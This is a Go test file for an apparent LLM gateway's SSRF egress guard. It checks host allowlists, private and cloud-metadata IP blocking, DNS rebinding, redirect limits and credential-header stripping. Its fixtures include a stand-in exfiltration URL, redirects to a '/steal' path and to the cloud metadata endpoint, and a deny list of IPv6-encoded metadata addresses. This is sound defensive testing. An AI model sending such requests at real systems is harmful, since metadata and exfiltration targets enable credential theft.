// Copyright 2026 The Tanpopo Authors.
// Licensed under the Apache License, Version 2.0.

package egress

import (
	"context"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"net/url"
	"os"
	"strings"
	"sync/atomic"
	"testing"
	"time"

	"github.com/nguywnben/tanpopo/internal/testkit/fakellm"
	"github.com/nguywnben/tanpopo/internal/testkit/netguard"
)

func TestMain(m *testing.M) {
	os.Exit(netguard.MustRunHermeticMain(m))
}

type mockResolver struct {
	calls atomic.Int64
	fn    func(callIdx int64, host string) ([]netip.Addr, error)
}

func (m *mockResolver) LookupNetIP(_ context.Context, _ string, host string) ([]netip.Addr, error) {
	n := m.calls.Add(1)
	return m.fn(n, host)
}

func TestSSRFGuardAllowsConfiguredLoopbackLANTarget(t *testing.T) {
	t.Parallel()

	srv := fakellm.NewServer(t)
	client, err := NewGuardedHTTPClient(ClientConfig{
		Policy: Policy{
			AllowedHosts:   []string{srv.Addr()},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"127.0.0.1/32"},
		},
		ControlHook: netguard.Control,
	})
	if err != nil {
		t.Fatalf("NewGuardedHTTPClient: %v", err)
	}

	req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, srv.URL()+"/v1/models", nil)
	if err != nil {
		t.Fatalf("NewRequestWithContext: %v", err)
	}
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("expected loopback LAN request to succeed, got %v", err)
	}
	_ = resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		t.Fatalf("expected 200 OK, got %d", resp.StatusCode)
	}
}

func TestSSRFGuardBlocksUnapprovedHostPreDNS_NEG1_CT14(t *testing.T) {
	t.Parallel()

	res := &mockResolver{
		fn: func(_ int64, _ string) ([]netip.Addr, error) {
			return []netip.Addr{netip.MustParseAddr("93.184.216.34")}, nil
		},
	}

	client, err := NewGuardedHTTPClient(ClientConfig{
		Policy: Policy{
			AllowedHosts: []string{"api.example.com"},
			RequireTLS:   true,
		},
		Resolver:    res,
		ControlHook: netguard.Control,
	})
	if err != nil {
		t.Fatalf("NewGuardedHTTPClient: %v", err)
	}

	req, err := http.NewRequestWithContext(context.Background(), http.MethodPost, "https://evil.attacker.invalid/exfil", nil)
	if err != nil {
		t.Fatalf("NewRequestWithContext: %v", err)
	}
	resp, err := client.Do(req)
	if resp != nil {
		_ = resp.Body.Close()
	}
	if !errors.Is(err, ErrHostDenied) {
		t.Fatalf("expected ErrHostDenied (403 egress_host_denied), got %v", err)
	}
	if calls := res.calls.Load(); calls != 0 {
		t.Fatalf("expected 0 DNS lookups before allowlist block, got %d", calls)
	}
}

func TestSSRFGuardBlocksAllDeniedCIDRsAtControlTime(t *testing.T) {
	t.Parallel()

	d, err := NewDialer(DialerConfig{
		Policy: Policy{
			AllowedHosts: []string{"api.example.com"},
		},
	})
	if err != nil {
		t.Fatalf("NewDialer: %v", err)
	}

	blockedCases := []struct {
		name string
		addr string
		want error
	}{
		{name: "loopback_ipv4", addr: "127.0.0.1:443", want: ErrPrivateIPBlocked},
		{name: "rfc1918_10", addr: "10.0.0.1:443", want: ErrPrivateIPBlocked},
		{name: "rfc1918_172", addr: "172.16.4.5:443", want: ErrPrivateIPBlocked},
		{name: "rfc1918_192", addr: "192.168.1.10:443", want: ErrPrivateIPBlocked},
		{name: "cgnat_100_64", addr: "100.64.0.1:443", want: ErrPrivateIPBlocked},
		{name: "link_local_169_254", addr: "169.254.1.1:80", want: ErrMetadataBlocked},
		{name: "cloud_metadata_ipv4", addr: "169.254.169.254:80", want: ErrMetadataBlocked},
		{name: "alibaba_metadata", addr: "100.100.100.200:80", want: ErrMetadataBlocked},
		{name: "zero_net", addr: "0.0.0.0:80", want: ErrMetadataBlocked},
		{name: "ipv6_loopback", addr: "[::1]:443", want: ErrPrivateIPBlocked},
		{name: "ipv6_ula", addr: "[fc00::1]:443", want: ErrPrivateIPBlocked},
		{name: "ipv6_ec2_metadata", addr: "[fd00:ec2::254]:80", want: ErrMetadataBlocked},
		{name: "ipv6_link_local", addr: "[fe80::1]:80", want: ErrMetadataBlocked},
		{name: "ipv6_zone", addr: "[fe80::1%eth0]:80", want: ErrMetadataBlocked},
		{name: "ipv4_compat_metadata", addr: "[::169.254.169.254]:80", want: ErrMetadataBlocked},
		{name: "ipv4_compat_loopback", addr: "[::127.0.0.1]:443", want: ErrPrivateIPBlocked},
		{name: "siit_metadata", addr: "[::ffff:0:169.254.169.254]:80", want: ErrMetadataBlocked},
		{name: "siit_private", addr: "[::ffff:0:10.0.0.1]:80", want: ErrPrivateIPBlocked},
		{name: "ipv6_bench_rfc5180", addr: "[2001:2::1]:443", want: ErrPrivateIPBlocked},
		{name: "ipv6_orchidv2", addr: "[2001:20::1]:443", want: ErrPrivateIPBlocked},
		{name: "ipv6_doc_3fff", addr: "[3fff::1]:443", want: ErrPrivateIPBlocked},
		{name: "ipv4_mapped_metadata", addr: "[::ffff:169.254.169.254]:80", want: ErrMetadataBlocked},
		{name: "ipv4_mapped_loopback", addr: "[::ffff:127.0.0.1]:443", want: ErrPrivateIPBlocked},
		{name: "nat64_metadata", addr: "[64:ff9b::169.254.169.254]:80", want: ErrMetadataBlocked},
		{name: "6to4_metadata", addr: "[2002:a9fe:a9fe::1]:80", want: ErrMetadataBlocked},
	}

	for _, tc := range blockedCases {
		t.Run(tc.name, func(t *testing.T) {
			err := d.Control("tcp", tc.addr, nil)
			if !errors.Is(err, tc.want) {
				t.Fatalf("Control(%q): expected %v, got %v", tc.addr, tc.want, err)
			}
		})
	}
}

func TestSSRFGuardMetadataUnconditionallyBlockedEvenWithAllowPrivateIP(t *testing.T) {
	t.Parallel()

	d, err := NewDialer(DialerConfig{
		Policy: Policy{
			AllowedHosts:   []string{"gpu-node.internal:8000"},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"10.20.0.0/24", "169.254.0.0/16", "fe80::/10", "fd00::/8"},
		},
	})
	if err != nil {
		t.Fatalf("NewDialer: %v", err)
	}

	if err := d.Control("tcp", "10.20.0.5:8000", nil); !errors.Is(err, ErrPrivateIPBlocked) {
		// Inside 10.20.0.0/24 -> passes checkConnectIP, only blocked by TANPOPO_TEST_HERMETIC non-loopback check.
		var egErr *Error
		if !errors.As(err, &egErr) || egErr.Code != "egress_hermetic_blocked" {
			t.Fatalf("expected only hermetic non-loopback block on allowed private IP, got %v", err)
		}
	}
	if err := d.checkConnectIP(netip.MustParseAddr("10.20.0.5"), 8000); err != nil {
		t.Fatalf("expected 10.20.0.5:8000 to be accepted by AllowedCIDRs policy, got %v", err)
	}

	for _, meta := range []string{
		"169.254.169.254:80",
		"[fd00:ec2::254]:80",
		"[fe80::1]:80",
		"[::ffff:169.254.169.254]:80",
		"[::169.254.169.254]:80",
		"[::ffff:0:169.254.169.254]:80",
		"[64:ff9b::169.254.169.254]:80",
		"[2002:a9fe:a9fe::1]:80",
	} {
		if err := d.CheckAddr(meta); !errors.Is(err, ErrMetadataBlocked) {
			t.Fatalf("metadata %q MUST be unconditionally blocked even with allow_private_ip=true, got %v", meta, err)
		}
	}

	tlsDialer, err := NewDialer(DialerConfig{
		Policy: Policy{
			AllowedHosts: []string{"api.example.com"},
			RequireTLS:   true,
		},
	})
	if err != nil {
		t.Fatalf("NewDialer(RequireTLS): %v", err)
	}
	if _, derr := tlsDialer.DialContext(context.Background(), "tcp", "api.example.com:80"); !errors.Is(derr, ErrHostDenied) {
		t.Fatalf("expected DialContext on port 80 rejected when RequireTLS=true, got %v", derr)
	}

	// Native IPv6 loopback ::1 must be allowed when explicitly authorized by AllowPrivateIP + AllowedCIDRs.
	v6LoopDialer, err := NewDialer(DialerConfig{
		Policy: Policy{
			AllowedHosts:   []string{"[::1]:8443"},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"::1/128"},
		},
	})
	if err != nil {
		t.Fatalf("NewDialer(::1): %v", err)
	}
	if cerr := v6LoopDialer.Control("tcp6", "[::1]:8443", nil); cerr != nil {
		t.Fatalf("expected [::1]:8443 to pass Control when explicitly allowed, got %v", cerr)
	}
}

func TestSSRFGuardRequiresNarrowedCIDRsWhenAllowPrivateIP(t *testing.T) {
	t.Parallel()

	if _, err := NewDialer(DialerConfig{
		Policy: Policy{
			AllowedHosts:   []string{"127.0.0.1:8080"},
			AllowPrivateIP: true,
		},
	}); !errors.Is(err, ErrInvalidPolicy) {
		t.Fatalf("expected ErrInvalidPolicy when AllowPrivateIP=true without AllowedCIDRs, got %v", err)
	}

	if _, err := NewDialer(DialerConfig{
		Policy: Policy{
			AllowedHosts:   []string{"127.0.0.1:8080"},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"0.0.0.0/0"},
		},
	}); !errors.Is(err, ErrInvalidPolicy) {
		t.Fatalf("expected ErrInvalidPolicy for 0.0.0.0/0 CIDR wildcard, got %v", err)
	}
}

func TestSSRFGuardDNSRebindingDefeated_NEG4_CT26(t *testing.T) {
	t.Parallel()

	// Lookup #1 returns a public IP; lookup #2 (at dial time) flips to cloud metadata or IPv4-mapped loopback.
	for _, flippedIP := range []string{"169.254.169.254", "::ffff:127.0.0.1", "10.0.0.1"} {
		flippedIP := flippedIP
		t.Run(flippedIP, func(t *testing.T) {
			res := &mockResolver{
				fn: func(callIdx int64, _ string) ([]netip.Addr, error) {
					if callIdx == 1 {
						return []netip.Addr{netip.MustParseAddr("93.184.216.34")}, nil
					}
					return []netip.Addr{netip.MustParseAddr(flippedIP)}, nil
				},
			}

			client, err := NewGuardedHTTPClient(ClientConfig{
				Policy: Policy{
					AllowedHosts: []string{"rebind.attacker.example"},
				},
				Resolver:    res,
				ControlHook: netguard.Control,
			})
			if err != nil {
				t.Fatalf("NewGuardedHTTPClient: %v", err)
			}

			// First attempt sees public IP 93.184.216.34 (hermetically stopped before internet TCP SYN).
			req1, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, "https://rebind.attacker.example/v1/models", nil)
			resp1, err1 := client.Do(req1)
			if resp1 != nil {
				_ = resp1.Body.Close()
			}
			if err1 == nil {
				t.Fatalf("expected first hermetic public dial to fail")
			}

			// Second attempt simulates TTL=0 DNS flip to internal IP; blocked unconditionally by SSRFGuardDialer.
			req2, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, "https://rebind.attacker.example/v1/models", nil)
			resp2, err2 := client.Do(req2)
			if resp2 != nil {
				_ = resp2.Body.Close()
			}
			if !errors.Is(err2, ErrMetadataBlocked) && !errors.Is(err2, ErrPrivateIPBlocked) {
				t.Fatalf("expected metadata/private IP block on DNS rebinding to %s, got %v", flippedIP, err2)
			}
		})
	}
}

func TestSSRFGuardPortScanBlocked_NEG4(t *testing.T) {
	t.Parallel()

	client, err := NewGuardedHTTPClient(ClientConfig{
		Policy: Policy{
			AllowedHosts:   []string{"10.20.0.5:8000"},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"10.20.0.0/24"},
		},
		ControlHook: netguard.Control,
	})
	if err != nil {
		t.Fatalf("NewGuardedHTTPClient: %v", err)
	}

	req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, "http://10.20.0.5:6379/", nil)
	if err != nil {
		t.Fatalf("NewRequestWithContext: %v", err)
	}
	resp, err := client.Do(req)
	if resp != nil {
		_ = resp.Body.Close()
	}
	if !errors.Is(err, ErrHostDenied) || !errors.Is(err, ErrPortDenied) {
		t.Fatalf("expected ErrHostDenied + ErrPortDenied for unapproved port 6379, got %v", err)
	}
}

func TestRedirectGuardBlocksUnapprovedHostAndMetadata_NEG2_CT15(t *testing.T) {
	t.Parallel()

	var otherHits atomic.Int64
	unapprovedTarget := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		otherHits.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	defer unapprovedTarget.Close()

	var redirectDest atomic.Value
	approvedUpstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		dest, _ := redirectDest.Load().(string)
		http.Redirect(w, r, dest, http.StatusFound)
	}))
	defer approvedUpstream.Close()

	approvedAddr := strings.TrimPrefix(approvedUpstream.URL, "http://")
	client, err := NewGuardedHTTPClient(ClientConfig{
		Policy: Policy{
			AllowedHosts:   []string{approvedAddr},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"127.0.0.1/32"},
		},
		ControlHook: netguard.Control,
	})
	if err != nil {
		t.Fatalf("NewGuardedHTTPClient: %v", err)
	}

	for _, tc := range []struct {
		name string
		dest string
	}{
		{name: "external_unapproved_host", dest: "https://other-host.test/steal"},
		{name: "cloud_metadata", dest: "http://169.254.169.254/latest/meta-data/"},
		{name: "unapproved_loopback_port", dest: unapprovedTarget.URL + "/steal"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			redirectDest.Store(tc.dest)
			req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, approvedUpstream.URL+"/v1/chat", nil)
			req.Header.Set("Authorization", "Bearer top-secret")
			resp, err := client.Do(req)
			if resp != nil {
				_ = resp.Body.Close()
			}
			if !errors.Is(err, ErrRedirectBlocked) {
				t.Fatalf("expected ErrRedirectBlocked for 302 -> %s, got %v", tc.dest, err)
			}
		})
	}

	if otherHits.Load() != 0 {
		t.Fatalf("expected 0 requests reaching unapproved redirect target, got %d", otherHits.Load())
	}
}

func TestRedirectGuardStripsCredentialHeadersCrossOrigin_CT15(t *testing.T) {
	t.Parallel()

	var capturedHeaders atomic.Value
	targetB := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		capturedHeaders.Store(r.Header.Clone())
		w.WriteHeader(http.StatusOK)
	}))
	defer targetB.Close()

	targetA := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Redirect(w, r, targetB.URL+"/landing", http.StatusTemporaryRedirect)
	}))
	defer targetA.Close()

	addrA := strings.TrimPrefix(targetA.URL, "http://")
	addrB := strings.TrimPrefix(targetB.URL, "http://")

	client, err := NewGuardedHTTPClient(ClientConfig{
		Policy: Policy{
			AllowedHosts:     []string{addrA, addrB},
			AllowPrivateIP:   true,
			AllowedCIDRs:     []string{"127.0.0.1/32"},
			SensitiveHeaders: []string{"X-Custom-Secret"},
		},
		ControlHook: netguard.Control,
	})
	if err != nil {
		t.Fatalf("NewGuardedHTTPClient: %v", err)
	}

	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, targetA.URL+"/start", nil)
	req.Header.Set("Authorization", "Bearer cross-origin-secret")
	req.Header.Set("X-Api-Key", "key-123")
	req.Header.Set("X-Goog-Api-Key", "gkey-456")
	req.Header.Set("X-Custom-Secret", "custom-789")
	req.Header.Set("X-Safe-Trace", "trace-keep")

	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("redirect between two allowed hosts should succeed after stripping auth headers: %v", err)
	}
	_ = resp.Body.Close()

	hdrs, ok := capturedHeaders.Load().(http.Header)
	if !ok {
		t.Fatalf("targetB did not capture headers")
	}
	for _, banned := range []string{"Authorization", "X-Api-Key", "X-Goog-Api-Key", "X-Custom-Secret", "Cookie"} {
		if got := hdrs.Get(banned); got != "" {
			t.Fatalf("expected cross-origin redirect header %q to be 100%% stripped, got non-empty value", banned)
		}
	}
	if got := hdrs.Get("X-Safe-Trace"); got != "trace-keep" {
		t.Fatalf("expected non-sensitive header preserved, got %q", got)
	}
}

func TestHostMatchesHelperAndEnvProxyIgnored(t *testing.T) {
	u, err := url.Parse("https://api.example.com/v1/models")
	if err != nil {
		t.Fatalf("url.Parse: %v", err)
	}
	if !HostMatches(u, []string{"api.example.com"}) {
		t.Fatalf("expected https://api.example.com to match api.example.com")
	}
	uPort, _ := url.Parse("https://api.example.com:6379/v1/models")
	if HostMatches(uPort, []string{"api.example.com"}) {
		t.Fatalf("expected port 6379 to fail against host-only allowlist entry")
	}
	if HostMatches(u, []string{"*"}) {
		t.Fatalf("expected wildcard allowed_hosts to be rejected")
	}

	// Ensure HTTP_PROXY cannot hijack SSRFGuard transport.
	t.Setenv("HTTP_PROXY", "http://127.0.0.1:1")
	t.Setenv("HTTPS_PROXY", "http://127.0.0.1:1")
	srv := fakellm.NewServer(t)
	client, err := NewGuardedHTTPClient(ClientConfig{
		Policy: Policy{
			AllowedHosts:   []string{srv.Addr()},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"127.0.0.1/32"},
		},
		ControlHook: netguard.Control,
	})
	if err != nil {
		t.Fatalf("NewGuardedHTTPClient: %v", err)
	}
	req, _ := http.NewRequestWithContext(context.Background(), http.MethodGet, srv.URL()+"/v1/models", nil)
	resp, err := client.Do(req)
	if err != nil {
		t.Fatalf("expected HTTP_PROXY to be ignored by SSRFGuard transport, got %v", err)
	}
	_ = resp.Body.Close()
}

func TestSSRFGuardEdgeCasesAndRedirectLimits(t *testing.T) {
	t.Parallel()

	// Empty allowed_hosts / invalid URL / userinfo / trailing dot / wildcard rejections.
	if _, err := (Policy{AllowedHosts: nil}).ValidateTargetURL("https://api.example.com"); !errors.Is(err, ErrHostDenied) {
		t.Fatalf("expected ErrHostDenied on empty AllowedHosts, got %v", err)
	}
	p := Policy{AllowedHosts: []string{"api.example.com", "[::1]:8443"}, RequireTLS: true}
	if _, err := p.ValidateTargetURL("http://api.example.com/v1"); !errors.Is(err, ErrTLSRequired) {
		t.Fatalf("expected ErrTLSRequired for plain http, got %v", err)
	}
	if _, err := p.ValidateTargetURL("https://user:pass@api.example.com/v1"); !errors.Is(err, ErrHostDenied) {
		t.Fatalf("expected ErrHostDenied for userinfo authority confusion, got %v", err)
	}
	if _, err := p.ValidateTargetURL("https://api.example.com./v1"); !errors.Is(err, ErrHostDenied) {
		t.Fatalf("expected ErrHostDenied for trailing dot FQDN, got %v", err)
	}
	if _, err := p.ValidateTargetURL("ftp://api.example.com/file"); !errors.Is(err, ErrHostDenied) {
		t.Fatalf("expected ErrHostDenied for ftp scheme, got %v", err)
	}

	// Control rejects non-TCP networks, non-numeric hosts, invalid ports, and unapproved ports.
	d, err := NewDialer(DialerConfig{
		Policy: Policy{
			AllowedHosts:   []string{"gpu.internal"},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"10.20.0.0/24"},
			AllowedPorts:   []int{8443},
		},
	})
	if err != nil {
		t.Fatalf("NewDialer: %v", err)
	}
	if cerr := d.Control("udp", "127.0.0.1:53", nil); !errors.Is(cerr, ErrHostDenied) {
		t.Fatalf("expected non-TCP udp blocked, got %v", cerr)
	}
	if cerr := d.Control("tcp", "10.20.0.5:99999", nil); !errors.Is(cerr, ErrPortDenied) {
		t.Fatalf("expected invalid port blocked, got %v", cerr)
	}
	if cerr := d.Control("tcp", "not-an-ip:8443", nil); !errors.Is(cerr, ErrPrivateIPBlocked) {
		t.Fatalf("expected non-numeric host rejected in Control, got %v", cerr)
	}
	if cerr := d.Control("tcp", "10.20.0.5:6379", nil); !errors.Is(cerr, ErrPortDenied) {
		t.Fatalf("expected port 6379 rejected against AllowedPorts=[8443], got %v", cerr)
	}

	// Direct RedirectGuard unit tests: HTTPS downgrade, DenyCrossOriginRedirects, MaxRedirects exceeded.
	rg, err := NewRedirectGuard(RedirectConfig{
		Policy: Policy{
			AllowedHosts: []string{"api.example.com"},
		},
		MaxRedirects:             2,
		DenyCrossOriginRedirects: true,
	})
	if err != nil {
		t.Fatalf("NewRedirectGuard: %v", err)
	}
	initialReq, _ := http.NewRequest(http.MethodGet, "https://api.example.com/a", nil)
	downgradeReq, _ := http.NewRequest(http.MethodGet, "http://api.example.com/b", nil)
	downgradeReq.Header.Set("Authorization", "Bearer s")
	if rerr := rg(downgradeReq, []*http.Request{initialReq}); !errors.Is(rerr, ErrRedirectBlocked) {
		t.Fatalf("expected HTTPS->HTTP downgrade blocked, got %v", rerr)
	}
	if downgradeReq.Header.Get("Authorization") != "" {
		t.Fatalf("expected Authorization stripped on blocked redirect")
	}

	hopLimitReq, _ := http.NewRequest(http.MethodGet, "https://api.example.com/c", nil)
	if rerr := rg(hopLimitReq, []*http.Request{initialReq, initialReq}); !errors.Is(rerr, ErrRedirectBlocked) {
		t.Fatalf("expected hop limit exceeded error, got %v", rerr)
	}

	// Error formatting & Unwrap check.
	e := &Error{HTTPStatus: 403, Code: "egress_host_denied", Message: "denied", Err: ErrHostDenied}
	if !strings.Contains(e.Error(), "egress_host_denied") || !errors.Is(e, ErrHostDenied) {
		t.Fatalf("unexpected Error formatting or Unwrap: %q", e.Error())
	}
}

func TestNewGuardedHTTPClient_DisableTotalTimeout(t *testing.T) {
	t.Parallel()

	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		switch r.URL.Path {
		case "/slow-headers":
			select {
			case <-r.Context().Done():
				return
			case <-time.After(400 * time.Millisecond):
			}
			w.WriteHeader(http.StatusOK)
		case "/slow-stream":
			w.Header().Set("Content-Type", "text/event-stream")
			w.WriteHeader(http.StatusOK)
			if fl, ok := w.(http.Flusher); ok {
				fl.Flush()
			}
			for i := 0; i < 3; i++ {
				select {
				case <-r.Context().Done():
					return
				case <-time.After(60 * time.Millisecond):
				}
				_, _ = w.Write([]byte("data: ok\n\n"))
				if fl, ok := w.(http.Flusher); ok {
					fl.Flush()
				}
			}
		}
	}))
	defer srv.Close()

	u, err := url.Parse(srv.URL)
	if err != nil {
		t.Fatal(err)
	}
	client, err := NewGuardedHTTPClient(ClientConfig{
		Policy: Policy{
			AllowedHosts:   []string{u.Host},
			AllowPrivateIP: true,
			AllowedCIDRs:   []string{"127.0.0.1/32"},
		},
		Timeout:               80 * time.Millisecond,
		DisableTotalTimeout:   true,
		ResponseHeaderTimeout: 80 * time.Millisecond,
	})
	if err != nil {
		t.Fatalf("NewGuardedHTTPClient: %v", err)
	}
	if client.Timeout != 0 {
		t.Fatalf("expected client.Timeout == 0 when DisableTotalTimeout=true, got %v", client.Timeout)
	}

	// Slow headers exceed ResponseHeaderTimeout (80ms < 400ms) -> fail promptly.
	if resp, err := client.Get(srv.URL + "/slow-headers"); err == nil {
		_ = resp.Body.Close()
		t.Fatal("expected slow-headers to time out via ResponseHeaderTimeout")
	}

	// Fast headers + slow body totaling ~180ms (> 80ms) must succeed without total timeout abort.
	resp, err := client.Get(srv.URL + "/slow-stream")
	if err != nil {
		t.Fatalf("expected slow-stream to survive past ResponseHeaderTimeout, got %v", err)
	}
	defer func() { _ = resp.Body.Close() }()
	body, rerr := io.ReadAll(resp.Body)
	if rerr != nil {
		t.Fatalf("read slow-stream body: %v", rerr)
	}
	if strings.Count(string(body), "data: ok") != 3 {
		t.Fatalf("expected 3 streamed chunks, got %q", string(body))
	}
}


